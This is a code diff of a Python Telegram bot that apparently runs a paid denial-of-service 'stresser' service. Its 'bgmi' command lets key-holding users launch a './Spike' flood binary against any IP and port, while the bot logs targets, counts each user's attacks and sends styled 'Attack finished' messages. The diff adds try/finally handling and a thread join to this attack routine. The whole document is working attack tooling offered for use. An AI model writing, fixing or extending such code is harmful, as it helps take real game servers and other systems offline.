@@ -44,34 +44,36 @@ def parse_duration(duration_str):
 def attack(ip, port, context, chat_id, user_id):
     global attack_running
 
-    # Run the attack command
-    subprocess.run(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
+    try:
+        # Run the attack command
+        subprocess.run(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
 
-    # Log the attack in Kolkata timezone
-    attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
-    attack_logs.append({
-        "user_id": user_id,
-        "ip": ip,
-        "port": port,
-        "time": attack_time
-    })
+        # Log the attack in Kolkata timezone
+        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
+        attack_logs.append({
+            "user_id": user_id,
+            "ip": ip,
+            "port": port,
+            "time": attack_time
+        })
 
-    # Increment attack count for the user
-    if user_id in authorized_users:
-        authorized_users[user_id]["attacks"] += 1
+        # Increment attack count for the user
+        if user_id in authorized_users:
+            authorized_users[user_id]["attacks"] += 1
 
-    # Notify that the attack is finished
-    attack_finished_message = (
-        f"✅ 𝘈𝘵𝘵𝘢𝘤𝘬 𝘧𝘪𝘯𝘪𝘴𝘩𝘦𝘥!\n\n"
-        f"𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗜𝗣: `{ip}`\n"
-        f"𝗣𝗼𝗿𝘁: `{port}`\n"
-        f"𝗧𝗶𝗺𝗲: `{MAX_ATTACK_TIME} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌`\n"
-        f"⏰ �𝘛𝘪𝘮𝘦𝘴𝘵𝘢𝘮𝘱: `{attack_time}`"
-    )
-    asyncio.run(context.bot.send_message(chat_id=chat_id, text=attack_finished_message, parse_mode="Markdown"))
+        # Notify that the attack is finished
+        attack_finished_message = (
+            f"✅ 𝘈𝘵𝘵𝘢𝘤𝘬 𝘧𝘪𝘯𝘪𝘴𝘩𝘦𝘥!\n\n"
+            f"𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗜𝗣: `{ip}`\n"
+            f"𝗣𝗼𝗿𝘁: `{port}`\n"
+            f"𝗧𝗶𝗺𝗲: `{MAX_ATTACK_TIME} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌`\n"
+            f"⏰ 𝘛𝘪𝘮𝘦𝘴𝘵𝘢𝘮𝘱: `{attack_time}`"
+        )
+        asyncio.run(context.bot.send_message(chat_id=chat_id, text=attack_finished_message, parse_mode="Markdown"))
 
-    # Mark attack as finished
-    attack_running = False
+    finally:
+        # Ensure the attack_running flag is reset even if an error occurs
+        attack_running = False
 
 # Command: Start the bot
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -148,7 +150,12 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(attack_details, parse_mode="Markdown")
 
     # Run the attack in a separate thread
-    threading.Thread(target=attack, args=(ip, port, context, update.message.chat_id, user_id)).start()
+    attack_thread = threading.Thread(target=attack, args=(ip, port, context, update.message.chat_id, user_id))
+    attack_thread.start()
+
+    # Wait for the attack to finish and reset the flag
+    attack_thread.join()  # This ensures the main thread waits for the attack to finish
+    attack_running = False  # Reset the flag after the attack is done
 
 # Command: Generate a key (Admin only)
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
